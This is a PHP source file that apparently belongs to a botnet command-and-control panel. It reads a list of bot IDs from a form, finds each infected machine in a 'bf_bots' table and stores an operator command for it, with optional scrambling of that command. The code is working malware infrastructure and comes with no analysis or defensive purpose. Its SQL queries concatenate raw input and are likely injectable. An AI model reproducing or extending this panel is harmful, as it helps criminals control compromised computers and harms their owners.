<?php

get_function('real_escape_string');

function str2db($str){
    global $config, $rc;
    get_function('rc');
    if($config['scramb'] == 1){
        return rc_encode($str);
    }else{
        return $str;
    }
}

if(isset($_POST['submit'])){
	@array_walk($_POST, 'real_escape_string');

	if(empty($_POST['uids'])){
		$bad_form['uids'] = $lang['alnbp'];
		$FORM_BAD = 1;
	}
        
	if($FORM_BAD <> 1){
		$_POST['uids'] = str_replace("\r", '', $_POST['uids']);
		$uids = explode("\n", $_POST['uids']);
                
                $b = array();
                
                if(!empty($_POST['cmd'])) $_POST['cmd'] = str2db($_POST['cmd']);
                
                foreach($uids as $item){
		    $item = trim($item);
                    $item = explode('0', $item, 2);
                    if(count($item) == 2){
                        $item['1'] = '0' . $item['1'];
                        $bot = $mysqli->query('SELECT id FROM bf_bots WHERE (prefix = \''.$item['0'].'\') AND (uid = \''.$item['1'].'\') LIMIT 1');
                        if(!empty($bot->id)){
                            $b[$item['0'] . $item['1']] = true;
                            $mysqli->query('UPDATE bf_bots SET cmd = \''.$_POST['cmd'].'\' WHERE (id = \''.$bot->id.'\') LIMIT 1');
                        }else{
                            $b[$item['0'] . $item['1']] = false;
                        }
                    }
                }
                
                $smarty->assign("b", $b);
                $smarty->assign("save", true);
	}else{
		if(count($bad_form) > 0){
			rsort($bad_form);
			for($i = 0; $i < count($bad_form); $i++){
				if ( $i & 1 ) $value_count = "1"; else $value_count = "2";
				$errors .= '<div class="t"><div class="t4" align="center">' . $bad_form[$i] . '</div></div>';
			}
		}
	}
	$smarty->assign("errors", $errors);
}

?>